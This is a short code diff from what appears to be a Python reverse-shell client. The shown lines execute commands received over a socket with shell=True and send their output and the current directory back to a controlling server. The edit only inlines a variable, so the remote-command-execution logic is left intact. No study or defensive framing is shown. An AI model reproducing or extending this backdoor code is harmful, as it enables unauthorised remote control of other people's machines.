@@ -79,9 +79,8 @@ def run():
         else:
             # execute the command and retrieve the results
             p = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = p.stdout
             # send the results back to the server
-            s.send(output + "\n".encode() + os.getcwd().encode())
+            s.send(p.stdout + "\n".encode() + os.getcwd().encode())
     s.close()
 
 
